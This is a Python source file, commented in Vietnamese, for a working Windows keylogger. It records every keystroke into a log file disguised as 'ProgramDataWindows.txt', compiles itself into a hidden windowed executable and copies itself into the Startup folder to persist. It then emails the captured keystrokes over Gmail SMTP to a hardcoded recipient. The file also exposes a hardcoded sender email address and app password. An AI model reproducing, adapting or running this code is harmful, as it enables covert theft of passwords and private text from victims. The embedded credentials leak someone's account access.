import datetime
import os
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication
import time
import sys
import threading
import shutil
import subprocess
import importlib

# ============================================================================
# ⚙️ CẤU HÌNH - SỬA CÁC GIÁ TRỊ DƯỚI ĐÂY
# ============================================================================

# Email configuration
SENDER_EMAIL = 'trungtqps31229@fpt.edu.vn'
SENDER_PASSWORD = 'ojpb nxqk sttl ujju'
RECIPIENT_EMAIL = 'trantrungdz147@gmail.com'
SMTP_SERVER = 'smtp.gmail.com'
SMTP_PORT = 587

# File configuration
LOG_FILE = 'ProgramDataWindows.txt'

# Email message
EMAIL_SUBJECT = 'Test email with attachment'
EMAIL_MESSAGE = 'This is a test email with attachment.'

# Timing configuration (giây)
INITIAL_DELAY = 180  # Chờ 3 phút trước khi gửi email lần đầu
INTERNET_CHECK_INTERVAL = 60  # Kiểm tra internet mỗi 1 phút

# ============================================================================

def check_and_install_dependencies():
    required_packages = {
        'keyboard': 'keyboard',
        'requests': 'requests',
        'PyInstaller': 'pyinstaller'
    }

    missing_packages = []

    for module_name, package_name in required_packages.items():
        try:
            importlib.import_module(module_name)
            print(f"✓ {module_name} đã cài đặt")
        except ImportError:
            print(f"✗ {module_name} chưa cài đặt")
            missing_packages.append(package_name)

    if missing_packages:
        print(f"\nĐang cài đặt các package: {', '.join(missing_packages)}...")
        try:
            subprocess.run([sys.executable, '-m', 'pip', 'install'] + missing_packages, check=True)
            print("Cài đặt thành công!")
            return True
        except Exception as e:
            print(f"Lỗi khi cài đặt: {str(e)}")
            return False
    else:
        print("\nTất cả package đã cài đặt!")
        return True

# Kiểm tra và cài đặt dependencies trước tiên
if not getattr(sys, 'frozen', False):
    print("=== Kiểm tra dependencies ===")
    if not check_and_install_dependencies():
        sys.exit(1)
    print("\n=== Hoàn thành kiểm tra ===\n")

# Import sau khi kiểm tra
import keyboard
import requests

def build_to_exe():
    try:
        script_path = os.path.realpath(__file__)
        current_dir = os.path.dirname(script_path)
        script_name = os.path.splitext(os.path.basename(script_path))[0]
        exe_path = os.path.join(current_dir, f'{script_name}.exe')

        if not os.path.exists(exe_path):
            print(f"Đang build {script_name}.py thành {script_name}.exe...")
            subprocess.run([
                sys.executable, '-m', 'PyInstaller',
                '--onefile',
                '--windowed',
                '--distpath', current_dir,
                '--workpath', os.path.join(current_dir, 'build'),
                '--name', script_name,
                script_path
            ], check=True)
            print("Build thành công!")
            return True
    except Exception as e:
        print(f"Lỗi khi build: {str(e)}")
    return False

def get_log_file_path():
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    return os.path.join(startup_folder, LOG_FILE)

log_file = get_log_file_path()

# Hàm để kiểm tra và xóa nội dung trong tệp keylog.txt (nếu có)
def clear_keylog():
    if os.path.exists(log_file):
        with open(log_file, "w") as f:
            f.truncate(0)
        print("Dữ liệu keylog đã được xóa.")
    else:
        print("Không có tệp keylog cũ.")

def on_key_event(event):
    key = event.name
    if len(key) > 1:
        if key == "space":
            key = " "
        elif key == "enter":
            key = "[ENTER]\n"
        else:
            key = "[" + key + "]"
    with open(log_file, "a") as f:
        f.write(key)

def get_current_script_directory():
    if getattr(sys, 'frozen', False):
        return os.path.dirname(sys.executable)
    else:
        return os.path.dirname(os.path.realpath(__file__))

def check_internet_connection():
    try:
        requests.get("http://www.google.com", timeout=5)
        return True
    except requests.ConnectionError:
        return False

def send_email(subject, message, to_email, attachment_path, email, password, smtp_server, smtp_port):
    # Thiết lập kết nối SMTP
    server = smtplib.SMTP(smtp_server, smtp_port)
    server.starttls()
    server.login(email, password)

    # Tạo một đối tượng MIMEMultipart
    msg = MIMEMultipart()
    msg['From'] = email
    msg['To'] = to_email
    msg['Subject'] = subject

    # Thêm nội dung email
    msg.attach(MIMEText(message, 'plain'))

    # Thêm file đính kèm
    with open(attachment_path, 'rb') as file:
        part = MIMEApplication(file.read(), Name=os.path.basename(attachment_path))
    part['Content-Disposition'] = f'attachment; filename="{os.path.basename(attachment_path)}"'
    msg.attach(part)

    # Gửi email
    server.sendmail(email, to_email, msg.as_string())

    # Đóng kết nối
    server.quit()

def copy_to_startup():
    try:
        startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

        if getattr(sys, 'frozen', False):
            source_file = sys.executable
            filename = os.path.basename(source_file)
        else:
            current_dir = get_current_script_directory()
            source_file = os.path.join(current_dir, 'system.py')
            filename = 'system.py'

        destination = os.path.join(startup_folder, filename)

        if os.path.exists(source_file) and not os.path.exists(destination):
            shutil.copy(source_file, destination)
            print(f"Đã copy {filename} vào Startup folder.")
        elif os.path.exists(destination):
            print(f"{filename} đã tồn tại trong Startup folder.")
    except Exception as e:
        print(f"Lỗi khi copy file vào Startup: {str(e)}")

def send_log_email():
    current_script_directory = get_current_script_directory()
    time.sleep(INITIAL_DELAY)
    while True:
        if check_internet_connection():
            attachment_path = os.path.join(current_script_directory, log_file)
            send_email(EMAIL_SUBJECT, EMAIL_MESSAGE, RECIPIENT_EMAIL, attachment_path,
                      SENDER_EMAIL, SENDER_PASSWORD, SMTP_SERVER, SMTP_PORT)
            break
        else:
            time.sleep(INTERNET_CHECK_INTERVAL)

def ensure_running_from_startup():
    is_frozen = getattr(sys, 'frozen', False)

    if is_frozen:
        startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        current_exe = sys.executable

        if not current_exe.lower().startswith(startup_folder.lower()):
            try:
                filename = os.path.basename(current_exe)
                destination = os.path.join(startup_folder, filename)

                if not os.path.exists(destination):
                    shutil.copy(current_exe, destination)

                subprocess.Popen([destination])
                sys.exit(0)
            except Exception as e:
                pass

# Kiểm tra xem đang chạy từ .py hay .exe
is_frozen = getattr(sys, 'frozen', False)

if not is_frozen:
    print("Chạy từ .py - đang build thành .exe...")
    if build_to_exe():
        print("Build thành công! Vui lòng chạy lại keylogger.exe")
        sys.exit(0)
    else:
        print("Build thất bại. Vui lòng cài đặt PyInstaller: pip install pyinstaller")
        sys.exit(1)
else:
    # Đảm bảo chạy từ Startup folder
    ensure_running_from_startup()

    print("Chạy từ Startup folder - bắt đầu các chức năng chính...")

    # Xóa dữ liệu keylog cũ (nếu có)
    clear_keylog()

    # Khởi động thread gửi email
    email_thread = threading.Thread(target=send_log_email, daemon=True)
    email_thread.start()

    # Khởi động keylogger
    keyboard.on_release(callback=on_key_event)

    try:
        while True:
            pass
    except KeyboardInterrupt:
        print("Dừng ghi lại.")
